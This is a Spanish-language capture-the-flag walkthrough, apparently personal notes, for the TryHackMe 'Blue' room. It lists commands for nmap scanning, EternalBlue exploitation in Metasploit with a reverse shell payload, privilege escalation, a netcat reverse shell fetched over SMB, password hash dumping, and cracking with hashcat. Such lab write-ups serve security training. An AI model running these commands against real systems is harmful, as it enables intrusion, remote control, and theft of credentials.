https://tryhackme.com/r/room/blue
# Fase de reconocimiento
## Buscar puertos abiertos
```
nmap -sT -Pn -p- --open --min-rate 5000 -T5 -vvv -n 10.10.101.248 -oG allports
```
![[Pasted image 20240427181452.png]]
## Reconocimiento de servicios
```
nmap -sCV -p135,139,445,3389 10.10.101.248 -oN targeted
```
![[Pasted image 20240427183221.png]]
## crackmapexec
```
crackmapexec smb 10.10.101.248
```
![[Pasted image 20240427181551.png]]

# Fase de ataque
## Metasploit
```
msfconsole
```
```
msf6> search eternalblue
```
![[Pasted image 20240427182201.png]]
```
msf6> use 0
```
```
msf6> show options
```
```
msf6> set RHOSTS 10.10.101.248
```
En este caso usamos shell porque queremos
```
msf6> set payload windows/x64/shell/reverse_tcp
```
En este caso por la VPN:
```
set LHOST 10.9.1.161
```
```
msf6> run
```
[-] ==pwned!==

# Privilege Escalation
```
msf6> search shell_to
```
![[Pasted image 20240427190335.png]]

```
msf6> use 0
```
```
msf6> show options
```
```
msf6> set SESSION 1
```
En este caso por la VPN:
```
msf6>set LHOST 10.9.1.161
```
```
msf6> run 
```
```
msf6> sessions -l
```
```
msf6> sessiobs -i 2
```
```
meterpreter> getsystem
```
[+] ==pwned!==

## Shell completa
1. Abrimos un smbserver
```
impacket-smbserver smbFolder $(pwd) -smb2support
```
2. Copiamos a través de archivos compartidos el netcat
```
copy \\<ip2>\smbFolder\nc64.exe C:\Windowss\Temp\nc.exe
```
3. Nos ponemos en escucha por el puerto 445
```
rlwrap nc -nlvp 445
```
4. Ejecutamos el netcat
```
C:\Windows\Temp\nc.exe -e cmd <ip> 445
```


# Post Explotation
```
meterpreter> ps
```
```
meterpreter> migrate ID_PROCESO
```
![[Pasted image 20240427192129.png]]
```
meterpreter> hashdump
```
![[Pasted image 20240427192123.png]]
```
hashcat -m 1000 hash /usr/share/wordlist/rockyou.txt
```
Found!

Buscar flags
```
meterpreter> search -f flag.txt
```